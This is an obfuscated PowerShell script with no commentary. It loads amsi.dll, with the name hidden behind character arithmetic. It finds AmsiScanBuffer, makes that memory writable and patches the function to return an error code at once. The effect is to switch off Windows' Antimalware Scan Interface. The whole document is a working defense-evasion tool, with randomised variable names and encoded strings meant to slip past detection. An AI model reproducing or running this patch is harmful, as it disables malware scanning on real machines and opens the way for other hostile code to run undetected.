$Bpt5A = @"
using System;
using System.Runtime.InteropServices;
public class Bpt5A {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr kN8RT0pNUE, string fHLG9M);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr cDQY7, UIntPtr vWcrcVD, uint SGouUwDrEjv, out uint sXvSisKlaoESBo76S9);
}
"@

Add-Type $Bpt5A

$MByz = [Bpt5A]::LoadLibrary("$(('ä'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').nOrMalIze([ChAR]([bYtE]0x46)+[CHar](111+8-8)+[CHaR]([bYTE]0x72)+[CHAR]([bYTE]0x6d)+[ChAr]([BYTE]0x44)) -replace [char](92*47/47)+[CHaR]([bYTe]0x70)+[cHar](123*16/16)+[cHAR]([byTe]0x4d)+[chaR](110)+[cHAr](58+67))")
$z0ktdcVjwbhbIuMZ = [Bpt5A]::GetProcAddress($MByz, "$([CHAr]([ByTE]0x41)+[CHar]([ByTE]0x6d)+[cHAr]([bYTe]0x73)+[chAR]([bYte]0x69)+[cHAr]([BytE]0x53)+[CHAR]([bytE]0x63)+[CHaR]([ByTe]0x61)+[ChAr](110)+[ChAR]([byte]0x42)+[cHAr]([byTe]0x75)+[ChAR]([ByTE]0x66)+[CHAr](102)+[cHaR]([bYTe]0x65)+[ChAr](114*100/100))")
$p = 0
[Bpt5A]::VirtualProtect($z0ktdcVjwbhbIuMZ, [uint32]5, 0x40, [ref]$p)
$MIPvhXSB5cP_4gK = "0xB8"
$zHnu_OE = "0x57"
$zGbsVzyKYC2yGn4KT = "0x00"
$atGEZbG6 = "0x07"
$miM = "0x80"
$s6GR5k01HvkLw = "0xC3"
$LL9N4zYI7zmrS0Iv = [Byte[]] ($MIPvhXSB5cP_4gK,$zHnu_OE,$zGbsVzyKYC2yGn4KT,$atGEZbG6,+$miM,+$s6GR5k01HvkLw)
[System.Runtime.InteropServices.Marshal]::Copy($LL9N4zYI7zmrS0Iv, 0, $z0ktdcVjwbhbIuMZ, 6)